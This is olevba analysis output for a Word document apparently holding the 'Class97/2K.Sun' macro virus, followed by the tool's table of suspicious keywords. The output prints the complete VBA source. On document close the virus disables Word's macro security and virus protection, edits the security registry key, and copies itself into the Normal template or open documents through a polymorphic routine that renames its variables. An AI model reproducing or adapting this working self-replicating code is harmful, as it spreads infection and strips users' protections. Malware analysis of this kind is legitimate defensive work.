olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Const Gt77314 = "9.0", Qi70845 = "Macro", Jh789373 = 3, Vg56948 = 0, Io76653 = &H1, Np297622 = 1
If Application.Version = Gt77314 Then
CommandBars(Qi70845).Controls(Jh789373).Enabled = (Rnd * Vg56948)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Io76653
Else
Options.VirusProtection = (Rnd * Vg56948)
End If
Options.SaveNormalPrompt = (Rnd * Vg56948)
Set Ou279828 = ThisDocument.VBProject.VBComponents(Np297622).CodeModule
If MacroContainer = ActiveDocument Then Set Sn985910 = NormalTemplate.VBProject.VBComponents(Np297622).CodeModule Else Set Sn985910 = ActiveDocument.VBProject.VBComponents(Np297622).CodeModule: Sz542915 = (Rnd * Np297622)
If Ou279828.countoflines <> Sn985910.countoflines Then
Sn985910.deletelines Np297622, Sn985910.countoflines
Sn985910.insertlines Np297622, It160162(Ou279828.lines(Np297622, Ou279828.countoflines))
If Sz542915 <> Vg56948 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Vg56948)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function It160162(Cn693912) As String ' PVP v1.1
Const Vg56948 = 0, Np297622 = 1, Ek979243 = 21, Lx998675 = 22, An99102 = 65, Rt45295 = 122, It947978 = 999
Dim Oq412712(Np297622 To Ek979243)
Oq412712(1) = "Gt77314": Oq412712(2) = "Qi70845": Oq412712(3) = "Jh789373": Oq412712(4) = "Vg56948": Oq412712(5) = "Io76653": Oq412712(6) = "Np297622": Oq412712(7) = "Ou279828": Oq412712(8) = "Sn985910"
Oq412712(9) = "Ek979243": Oq412712(10) = "Lx998675": Oq412712(11) = "An99102": Oq412712(12) = "Rt45295": Oq412712(13) = "It947978": Oq412712(14) = "It160162": Oq412712(15) = "Oq412712": Oq412712(16) = "Hm207185"
Oq412712(17) = "My457904": Oq412712(18) = "Fi378289": Oq412712(19) = "Um627428": Oq412712(20) = "Cn693912": Oq412712(21) = "Sz542915"
For Hm207185 = Np297622 To Ek979243
My457904 = Chr(An99102 + Int(Rnd * Lx998675)) & Chr(Rt45295 - Int(Rnd * Lx998675)) & Int(Rnd * It947978) & Int(Rnd * It947978)
Fi378289 = Np297622
Um627428: Fi378289 = InStr(Fi378289 + Np297622, Cn693912, Oq412712(Hm207185))
If Fi378289 <> Vg56948 Then Cn693912 = Mid(Cn693912, Np297622, (Fi378289 - Np297622)) & My457904 & Mid(Cn693912, (Fi378289 + Len(Oq412712(Hm207185))), Len(Cn693912)): GoTo Um627428
Next
It160162 = Cn693912
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

